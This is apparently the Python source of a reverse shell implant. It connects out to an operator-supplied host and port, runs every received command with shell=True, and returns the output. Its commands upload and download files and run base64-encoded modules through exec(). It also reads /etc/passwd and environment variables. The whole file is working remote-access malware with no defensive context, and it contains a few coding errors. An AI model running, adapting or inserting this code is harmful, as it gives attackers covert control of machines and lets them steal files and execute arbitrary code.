#!/usr/bin/env python
import os, sys, re
import socket
import time
import shutil
from base64 import *
from subprocess import Popen,PIPE,STDOUT,call

socksize = 4096                            
activePID = []
home = os.environ['HOME']
username = os.environ['USERNAME']
if os.geteuid() != 0:
    currentuser = "nonroot"
else:
    currentuser = "root"


def users():
    userlist = []
    if os.access('/etc/passwd', os.R_OK):
        passwd = open('/etc/passwd')
        for line in passwd:
            fields = line.split(':')
            uid = int(fields[2])
            if uid > 500 and uid < 32328:
                userlist.append(fields[0])


def whereis(program):
    for path in os.environ.get('PATH', '').split(':'):
        if os.path.exists(os.path.join(path, program)) and \
            not os.path.isdir(os.path.join(path, program)):
                return os.path.join(path, program)
    return None


def module_handler(module, modname):
    status_msg("[~] Module: %s\n" % modname)
    exec(module)
    connection.send("[%s] shell => " % username)


def status_msg(message):
    connection.send("[~] %s" % message)
    
    
def error_msg(message):
    connection.send("[!] %s" & message)


def cat_file(filename):
    if os.path.exists(filename) and os.access(filename, os.R_OK):
        catfile = open(filename, "rb")
        connection.send("[*] Contents of %s" % filename)
        for lines in catfile.readlines():
            connection.sendall(lines)
        catfile.close()


def save_file(filename):
    if os.path.exists(filename) and os.access(filename, os.R_OK):
        savefile = open(filename, "rb")
        filedata = savefile.read()
        savefile.close()
        connection.send(":savef %s" % filename)
        time.sleep(2)
        connection.sendall( filedata )
    else:
        pass


def cmd_exec(command):
    proc = Popen(command,
              shell=True,
              stdout=PIPE,
              stderr=PIPE,
               stdin=PIPE,
               )
    stdout, stderr = proc.communicate()
    connection.sendall( stdout )


def cmd_save(command, textfile):
    try:
        output = subprocess.check_output(command, shell=True)
        output = output.split("\n")
        new = file(textfile, "wb")
        for lines in output:
            new.write(lines+"\n")
        new.close()
        save_file(textfile)
        os.system("rm %s" % textfile)
    except:
        status_msg("error piping command output to file!")


def main(HOST, PORT):
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        connection.connect((HOST, PORT))
        connection.send("[%s] shell => " % username)
    except:
        sys.exit(2)
    
    while True:
        cmd = connection.recv(socksize)
        proc = Popen(cmd,
                shell=True,
                stdout=PIPE,
                stderr=PIPE,
                stdin=PIPE,
                )
        stdout, stderr = proc.communicate()
        if cmd.startswith('cd'):
            try:
                destination = cmd[3:].replace('\n','')
                if os.path.isdir(destination):
                    os.chdir(destination)
                    current = os.getcwd()
                    connection.send("[*] current directory: %s" % current)
                    connection.send("[%s] shell => " % username)
                else:
                    connection.send("[!] Directory does not exist") 
                    connection.send("[%s] shell => " % username)
            except IndexError:
                pass        
        if cmd.startswith(":upload"):
            try:
                getname = cmd.split(" ")
                rem_file = getname[1]
                filename = rem_file.replace("/","_")
                filedata = connection.recv(socksize)
                newfile = file(filename, "wb")
                newfile.write(filedata)
                newfile.close()
                if os.path.isfile(filename):
                    connection.send("[*] File upload complete!")
                if not os.path.isfile(filename):
                    connection.send("[!] File upload failed! Please try again")
            except IndexError:
                pass
        elif cmd.startswith(":download"):
            try:
                getname = cmd.split(" ")
                loc_file = getname[1]
                if os.path.exists(loc_file) is True:
                    sendfile = open(loc_file, "r")
                    filedata = sendfile.read()
                    sendfile.close()
                    connection.sendall(filedata)
                else:
                    connection.send("[!] File not found!")
            except IndexError:
                pass    
        elif cmd.startswith(":exec"):
            try:
                getname = cmd.split(" ")
                modname = getname[1]
                mod_data = ""
                data = connection.recv(socksize)
                mod_data += data
                connection.send("Complete")
                modexec = b64decode(mod_data)
                module_handler(modexec, modname)
            except IndexError:
                pass
        elif cmd == (":quit"):
            connection.close()
            os._exit(0)
            sys.exit(0)
        elif proc:
            connection.send( stdout )
            connection.send("[%s] shell => " % username)

    connection.close() 
    sys.exit(0)


